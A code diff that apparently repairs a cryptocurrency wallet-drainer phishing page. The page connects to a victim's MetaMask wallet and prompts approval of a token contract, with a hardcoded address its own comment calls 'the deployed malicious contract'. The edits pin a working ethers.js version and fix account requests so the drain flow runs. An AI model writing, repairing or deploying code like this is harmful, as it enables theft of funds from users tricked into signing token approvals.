@@ -11,9 +11,9 @@
     <button id="approveContract">Approve Contract</button>
     <p id="status"></p>
 
-    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
+    <!-- Use a working version of ethers.js -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        // Initialize Ethers.js
         let provider;
         let userAddress;
         const contractAddress = "0xe1782468Df2D6B6Ca645A10EefebF4Df30a12683"; // Replace with the deployed malicious contract
@@ -87,7 +87,7 @@
         window.onload = async () => {
             if (window.ethereum) {
                 provider = new ethers.BrowserProvider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
+                await provider.send("eth_requestAccounts", []);  // Requesting accounts directly
                 document.getElementById("connectWallet").addEventListener("click", connectWallet);
                 document.getElementById("approveContract").addEventListener("click", approveContract);
             } else {
@@ -98,15 +98,16 @@
         // Function to connect MetaMask
         async function connectWallet() {
             try {
-                const accounts = await provider.listAccounts();
+                // Request the user's accounts
+                const accounts = await provider.send("eth_requestAccounts", []);
                 if (accounts.length === 0) {
                     alert("No MetaMask accounts found. Please login.");
                     return;
                 }
-                userAddress = accounts[0];
+                userAddress = accounts[0];  // Set the first account
                 document.getElementById("status").innerText = `Connected: ${userAddress}`;
             } catch (error) {
-                console.error(error);
+                console.error("Error connecting MetaMask:", error);
                 document.getElementById("status").innerText = "Failed to connect wallet.";
             }
         }
@@ -119,6 +120,7 @@
             }
 
             try {
+                // Create the token contract and malicious contract objects
                 const tokenContract = new ethers.Contract(tokenAddress, contractABI, provider.getSigner());
                 const maliciousContract = new ethers.Contract(contractAddress, contractABI_Malicious, provider.getSigner());
 
